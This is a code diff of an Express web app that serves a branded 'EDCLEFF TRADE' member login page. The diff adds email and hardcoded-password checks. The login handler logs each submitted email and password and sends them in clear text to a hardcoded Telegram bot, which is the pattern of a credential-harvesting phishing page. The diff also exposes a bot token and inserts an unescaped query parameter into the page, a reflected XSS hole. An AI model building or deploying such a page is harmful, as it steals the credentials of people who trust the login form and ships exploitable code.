@@ -5,12 +5,40 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.urlencoded({ extended: true }));
 
+// ---------- CONFIGURATION ----------
 const BOT_TOKEN = '8776500357:AAF_8kD26cKyjulIiida3tULY7ZjdrJBryw';
 const CHAT_ID = '7623047017';
 
-console.log('🔥 TELEGRAM BOT ACTIVE');
+// Set your own valid password here (change it)
+const VALID_PASSWORD = '12345';
 
-// LANDING PAGE - Beautiful login form
+// List of common disposable email domains (partial – you can add more)
+const disposableDomains = [
+  'mailinator.com', 'guerrillamail.com', '10minutemail.com', 'tempmail.com',
+  'throwawaymail.com', 'yopmail.com', 'trashmail.com', 'spamgourmet.com',
+  'temp-mail.org', 'fakeinbox.com', 'getnada.com', 'mohmal.com',
+  'dispostable.com', 'guerrillamail.net', 'sharklasers.com', 'guerrillamail.org'
+];
+
+// Helper: validate email format and disposable domains
+function isValidEmail(email) {
+  // 1. Basic format check (regex)
+  const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+  if (!emailRegex.test(email)) return false;
+
+  // 2. Extract domain (lowercase)
+  const domain = email.split('@')[1].toLowerCase();
+
+  // 3. Check against disposable list
+  if (disposableDomains.includes(domain)) return false;
+
+  // 4. All checks passed
+  return true;
+}
+
+console.log('🔥 TELEGRAM BOT ACTIVE (with email & password validation)');
+
+// ---------- LANDING PAGE (with validation) ----------
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -103,6 +131,16 @@ app.get('/', (req, res) => {
       background: #0e4a64;
       transform: scale(0.98);
     }
+    .error-message {
+      background: #fee2e2;
+      border-left: 4px solid #dc2626;
+      color: #991b1b;
+      padding: 10px;
+      border-radius: 12px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      text-align: left;
+    }
     .footer {
       margin-top: 32px;
       font-size: 11px;
@@ -117,6 +155,8 @@ app.get('/', (req, res) => {
     <div class="logo">✦</div>
     <h1>EDCLEFF TRADE</h1>
     <div class="subtitle">Secure Member Gateway</div>
+    <!-- show error message if any -->
+    ${req.query.error ? `<div class="error-message">⚠️ ${req.query.error}</div>` : ''}
     <form action="/login" method="POST">
       <div class="input-group">
         <label>📧 Email Address</label>
@@ -137,14 +177,27 @@ app.get('/', (req, res) => {
   `);
 });
 
-// PRODUCTS PAGE - After login, with actual products
+// ---------- LOGIN HANDLER (with full validation) ----------
 app.post('/login', (req, res) => {
   const { email, password } = req.body;
-  
+
+  // 1. Validate email (format + disposable domains)
+  if (!isValidEmail(email)) {
+    // Redirect back to landing page with error message
+    return res.redirect('/?error=Invalid%20email%20address%20or%20password%20input');
+  }
+
+  // 2. Validate password against hardcoded value
+  if (password !== VALID_PASSWORD) {
+    return res.redirect('/?error=Invalid%20email%20address%20or%20password%20input');
+  }
+
+  // ----- Validation passed: send Telegram alert and show products page -----
   console.log('📨 LOGIN:', email, password);
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20EDCLEFF%20LOGIN%0AEmail:%20${email}%0APassword:%20${password}`;
   https.get(url);
-  
+
+  // Products page (same beautiful design as before)
   res.send(`
 <!DOCTYPE html>
 <html lang="en">
